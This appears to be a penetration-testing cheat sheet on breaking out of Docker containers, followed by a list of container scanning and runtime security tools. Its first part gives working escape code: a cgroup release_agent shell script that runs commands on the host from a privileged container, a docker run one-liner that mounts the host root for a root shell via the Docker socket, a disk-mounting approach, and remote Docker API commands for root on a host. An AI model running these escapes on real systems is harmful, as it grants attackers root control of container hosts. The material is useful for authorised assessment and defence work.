Manual breakout - privileged containers
From this tweet this is a shell script which runs commands on the underlying host from a privileged container.

  d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o

save it as escape.sh and you can use it like, give privileged execution 

  ./escape.sh ps -ef

If the tooling suggests that the Docker socket is available at /var/run/docker.sock then you can just get the docker CLI tool and run any docker command. To breakout use :-

docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host - From this post. This will drop you into a root shell on the host.

Another approach for privileged containers is just to mount the underlying root filesystem. Run the mount command to get a list of filesystems. Usually files like /etc/resolv.conf are mounted off the underlying node disk, so just find that disk and mount the entire thing under something like /host and it’ll provide edit access to the node filesystem

  This is the default port for the Docker daemon where it requires credentials (client certificate), so you’re unlikely to get far without that. If you do have the certificate and key for access :-

  docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 info - format for the info command to confirm access.
docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host - root on the host

 Container Attack Surface Assessment & Breakout Tools
Useful tools to run inside a container to assess the sandbox that’s in use, and exploit some common breakout issues.

deepce - Docker Enumeration, Escalation of Privileges and Container Escapes
CDK - Container and Kubernetes auditing and breakout tool.
Container Vulnerability Scanning Tools
Trivy - Vulnerability and IaC scanner
Grype - Container vulnerability scanner
clair - Container vulnerability scanner
Docker Scout - Container Vulnerability scanner
dep-scan - Vulnerability and mis-configuration scanner
Neuvector Scanner - Container Vulnerability Scanning Tool.
IaC Scanning Tools that cover container formats
Trivy - Vulnerability and IaC scanner
Checkov - IaC scanner
KICS - IaC scanner
dep-scan - Vulnerability and mis-configuration scanner
Docker Security Tools
docker bench - Docker CIS Benchmark assessment tool
Dockle - Container Image Linter
cnspec - Assessment tool for multiple platforms including Docker and Kubernetes
Container Runtime Security Tools
Tracee. Container runtime security tooling
Falco. Container runtime security tooling
Kubearmor. Container runtime security enforcement tool
Tetragon. Container runtime security tool
Container Registry Tools
regclient - Another tool for interacting with container registries
crane - Tool for interacting with Container registries.
skopeo - Tool for interaction with Container registries
Container Image Tools
Dive - Tool for exploring Container image layers 
  
